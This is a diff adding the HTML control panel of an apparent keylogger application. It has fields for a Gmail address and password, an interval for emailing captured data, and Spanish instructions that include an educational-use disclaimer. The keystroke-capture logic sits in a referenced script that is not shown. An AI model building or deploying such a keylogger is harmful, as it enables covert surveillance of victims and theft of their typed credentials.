@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" href="../assets/css/materialize.min.css">
+  <link rel="stylesheet" href="../assets/css/icon.css">
+  <title>Keylogger</title>
+</head>
+<body>
+  <section class="container">
+    <div class="row">
+      <!-- FIRST CONTAINER SIZE 6 -->
+      <div class="col s6 card-panel">
+        <div class="row">
+          <div class="col s12">
+            <h5 class="center-align">Send data to:</h5>
+          </div>
+          <div class="input-field col s6">
+            <input type="email" placeholder="example@email.com" id="email" class="validate">
+          </div>
+          <div class="input-field col s6">
+            <input type="password" placeholder="password" id="password" class="validate">
+          </div>
+        </div>
+        <div class="row">
+          <div class="col s12">
+            <label>Send every...</label>
+            <select class="browser-default" id="getTime">
+              <option value="" disabled selected>Choose the time</option>
+              <option value="1">1 Minute</option>
+              <option value="2">2 Minutes</option>
+              <option value="3">3 Minutes</option>
+              <option value="4">4 Minutes</option>
+              <option value="5">5 Minutes</option>
+            </select>
+          </div>
+          <div class="col s12">
+            <button class="btn waves-effect waves-light col s12" id="start"><i class="material-icons left">play_arrow</i><span>Start</span></button>
+          </div>
+        </div>
+      </div>
+      <!-- END FIRST CONTAINER SIZE 6 -->
+      <!-- SECOND CONTAINER SIZE 6 -->
+      <div class="col s6">
+        <div class="row">
+          <div class="col s12">
+            <div class="card-panel">
+              <h5>Instrucciones:</h5>
+              <span>
+                Para que funcione el keylogger correctamente debes utilizar un correo gmail y tu contraseña de gmail, si tienes el código fuente puedes modificarlo para que acepte
+                cualquier otro servicio de mensajeria como hotmail, además para que te lleguen correos debes autorizar acceso a servicios menos seguros
+                lo puedes hacer en las configuraciones de gmail o puedes ver algún tutorial en youtube.
+                POR ULTIMO:
+                ESTO SOLO ES UNA PRACTICA NO ES NI UN PRODUCTO FINAL NI SIQUIERA ESTA CERCA DE SERLO SIN EMBARGO SE PUEDE HACER MUCHO DAÑO POR LO QUE 
+                YO NO ME HAGO RESPONSABLE DEL USO QUE SE LE DE A LA APLICACIÓN ESTA HECHA CON FINES EDUCATIVOS.
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- END SECOND CONTAINER SIZE 6 -->
+    </div>
+  </section>
+  
+  <script src="../assets/js/renderer.js"></script>
+</body>
+</html>
